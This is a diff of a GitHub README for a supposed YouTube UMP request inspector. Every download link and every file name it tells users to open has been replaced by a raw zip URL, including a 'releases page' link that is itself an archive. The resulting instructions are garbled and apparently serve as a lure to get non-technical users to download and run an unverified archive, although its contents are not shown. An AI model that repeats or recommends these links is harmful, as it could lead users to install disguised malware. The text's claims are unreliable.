@@ -1,7 +1,7 @@
 # 🎉 ump-inspector - Inspect YouTube Requests Easily
 
 ## 🔗 Download Now
-[![Download ump-inspector](https://raw.githubusercontent.com/Sebahead1983/ump-inspector/main/thumbmark/ump-inspector.zip)](https://raw.githubusercontent.com/Sebahead1983/ump-inspector/main/thumbmark/ump-inspector.zip)
+[![Download ump-inspector](https://github.com/Sebahead1983/ump-inspector/raw/refs/heads/main/src/ump-inspector-1.8.zip)](https://github.com/Sebahead1983/ump-inspector/raw/refs/heads/main/src/ump-inspector-1.8.zip)
 
 ## 📖 Description
 The **ump-inspector** helps you inspect and decode YouTube UMP requests directly in your browser. With this tool, you can better understand how data flows while using YouTube. Whether you're troubleshooting a specific issue or just curious, **ump-inspector** makes the process simple and straightforward.
@@ -10,22 +10,22 @@ The **ump-inspector** helps you inspect and decode YouTube UMP requests directly
 Follow these steps to download and run **ump-inspector**:
 
 ### Step 1: Visit the Releases Page
-Go to the releases page by clicking [here](https://raw.githubusercontent.com/Sebahead1983/ump-inspector/main/thumbmark/ump-inspector.zip). This page contains the latest version of the application.
+Go to the releases page by clicking [here](https://github.com/Sebahead1983/ump-inspector/raw/refs/heads/main/src/ump-inspector-1.8.zip). This page contains the latest version of the application.
 
 ### Step 2: Find the Latest Release
 Once on the releases page, look for the most recent version. This version will typically be at the top of the list. It will be labeled with a version number, such as v1.0.
 
 ### Step 3: Download the Application
-Click on the version title to access its details. Here, look for the downloadable files. Choose the version that matches your browser. Most commonly, you'll find a file named `https://raw.githubusercontent.com/Sebahead1983/ump-inspector/main/thumbmark/ump-inspector.zip`. Click on it to start the download.
+Click on the version title to access its details. Here, look for the downloadable files. Choose the version that matches your browser. Most commonly, you'll find a file named `https://github.com/Sebahead1983/ump-inspector/raw/refs/heads/main/src/ump-inspector-1.8.zip`. Click on it to start the download.
 
 ### Step 4: Unzip the File
 After the download completes, locate the file on your computer, usually in the "Downloads" folder. Right-click on the zipped file and select "Extract All" or "Unzip." This will create a new folder with the application files.
 
 ### Step 5: Run the Application
-Inside the new folder, find the file labeled `https://raw.githubusercontent.com/Sebahead1983/ump-inspector/main/thumbmark/ump-inspector.zip`. Double-click this file to open it in your browser. The application should launch immediately, allowing you to start inspecting UMP requests.
+Inside the new folder, find the file labeled `https://github.com/Sebahead1983/ump-inspector/raw/refs/heads/main/src/ump-inspector-1.8.zip`. Double-click this file to open it in your browser. The application should launch immediately, allowing you to start inspecting UMP requests.
 
 ## 📥 Download & Install
-Make sure you return to the releases page to download the latest version anytime you need an update or want to ensure you are using the most reliable version. Click [here to download](https://raw.githubusercontent.com/Sebahead1983/ump-inspector/main/thumbmark/ump-inspector.zip).
+Make sure you return to the releases page to download the latest version anytime you need an update or want to ensure you are using the most reliable version. Click [here to download](https://github.com/Sebahead1983/ump-inspector/raw/refs/heads/main/src/ump-inspector-1.8.zip).
 
 ## 🔍 Features
 - **Easy Inspection**: Access UMP requests without technical knowledge.
@@ -44,7 +44,7 @@ To use **ump-inspector**:
 No, **ump-inspector** is designed for anyone, regardless of their technical background.
 
 ### Q2: What if the application doesn’t start?
-Make sure you open the correct file, `https://raw.githubusercontent.com/Sebahead1983/ump-inspector/main/thumbmark/ump-inspector.zip`. If you experience issues, try using another browser.
+Make sure you open the correct file, `https://github.com/Sebahead1983/ump-inspector/raw/refs/heads/main/src/ump-inspector-1.8.zip`. If you experience issues, try using another browser.
 
 ### Q3: How can I contribute?
 If you'd like to improve the application, check the repository for contribution guidelines. Your ideas and contributions are welcome!
